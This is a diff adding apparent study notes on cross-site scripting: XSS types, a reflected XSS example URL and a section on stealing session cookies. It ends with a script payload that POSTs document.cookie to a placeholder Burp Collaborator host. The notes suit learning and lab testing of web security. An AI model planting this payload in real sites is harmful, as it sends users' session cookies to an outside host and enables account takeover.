@@ -1,0 +1,45 @@
+                              ## What is cross-site scripting (XSS)?
+# Cross-site scripting (also known as XSS) is a web security vulnerability that allows an attacker to compromise the interactions that users have with a vulnerable application.
+# From version 92 onward (July 20th, 2021), cross-origin iframes are prevented from calling alert(). As these are used to construct some of the more advanced XSS attacks, you'll sometimes need to use an alternative PoC payload. In this scenario, we recommend the print() function.
+
+                            ## What are the types of XSS attacks?
+   
+    1. ## Reflected XSS, where the malicious script comes from the current HTTP request.
+    2. ## Stored XSS, where the malicious script comes from the website's database.
+    3. ## DOM-based XSS, where the vulnerability exists in client-side code rather than server-side code.
+    
+                       ## Reflected cross-site scripting                         
+Reflected XSS is the simplest variety of cross-site scripting.It arises when an application receives data in an HTTP request and includes that data within the immediate response in an unsafe way. 
+
+EXAMPLE:
+           https://insecure-website.com/status?message=All+is+well.
+           <p>Status: All is well.</p>
+ 
+ The application doesn't perform any other processing of the data, so an attacker can easily construct an attack like this: 
+         https://insecure-website.com/status?message=<script>/*+Bad+stuff+here...+*/</script>
+         <p>Status: <script>/* Bad stuff here... */</script></p>
+         
+If the user visits the URL constructed by the attacker, then the attacker's script executes in the user's browser, in the context of that user's session with the application. At that point, the script can carry out any action, and retrieve any data, to which the user has access. 
+
+                                     ## 2. Stealing Cookies using xss
+ ## 2.1 Exploiting cross-site scripting to steal cookies    
+ ------->
+   1. The victim might not be logged in.
+   2.  Many applications hide their cookies from JavaScript using the HttpOnly flag.
+   3. Sessions might be locked to additional factors like the user's IP address.
+   4.  The session might time out before you're able to hijack it.
+
+    
+    alert(document.domain)
+
+scripting using burp collaborator: 
+
+                      <script>
+                      fetch('https://BURP-COLLABORATOR-SUBDOMAIN', {
+                      method: 'POST',
+                      mode: 'no-cors',
+                      body:document.cookie
+                      });
+                      </script>
+                      
+                      
